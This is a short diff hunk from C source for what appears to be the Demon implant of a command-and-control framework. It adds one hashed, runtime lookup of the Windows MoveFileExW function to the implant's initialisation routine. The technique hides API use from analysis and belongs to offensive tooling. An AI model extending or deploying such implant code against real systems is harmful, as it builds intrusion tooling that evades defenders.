@@ -442,6 +442,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance.Win32.DeleteFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DELETEFILEW );
         Instance.Win32.CreateDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEDIRECTORYW );
         Instance.Win32.CopyFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_COPYFILEW );
+        Instance.Win32.MoveFileExW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_MOVEFILEEXW );
         Instance.Win32.SetCurrentDirectoryW            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_SETCURRENTDIRECTORYW );
         Instance.Win32.Wow64DisableWow64FsRedirection  = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64DISABLEWOW64FSREDIRECTION );
         Instance.Win32.Wow64RevertWow64FsRedirection   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_WOW64REVERTWOW64FSREDIRECTION );
